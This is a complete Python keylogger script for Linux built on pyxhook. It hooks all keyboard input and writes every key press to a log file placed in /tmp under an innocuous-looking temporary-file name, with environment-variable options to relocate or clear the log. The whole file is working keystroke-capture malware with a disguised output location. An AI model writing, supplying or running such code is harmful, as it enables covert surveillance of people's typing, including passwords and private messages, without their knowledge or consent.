#!/usr/bin/python3
# Written by Felix Hellmich

import os
import pyxhook

# create and set log file
log_file = os.environ.get('pylogger_file', os.path.expanduser('/tmp/Temp-707e7c0e-ee87-4859-1337-55e7624706d7'))
# allows setting cancel key from environment args, Default: `
cancel_key = ord(os.environ.get('pylogger_cancel','`')[0])

# allow clearing log file on start (if pylogger_clean is defined)
if os.environ.get('pylogger_clean', None) is not None:
    try:
        os.remove(log_file)
    except EnvironmentError:
        # no existing log file, or no permissions
        pass
# catches events & safes them in the log file
def OnKeyPress(event):
    with open(log_file, 'a') as f:
        f.write(f'{event.Key}\n')

# creates hook manager object
new_hook = pyxhook.HookManager()
new_hook.KeyDown = OnKeyPress
# set the hook
new_hook.HookKeyboard()
try:
    new_hook.start() # start the hook
except KeyboardInterrupt:
    # User cancelled
    pass
except Exception as ex:
    # Write exceptions to log file (for analysis).
    msg = f'Error while catching events;\n\t{ex}'
    pyxhook.print_err(msg)
    with open(log_file, 'a') as f:
        f.write(f'\n{msg}')
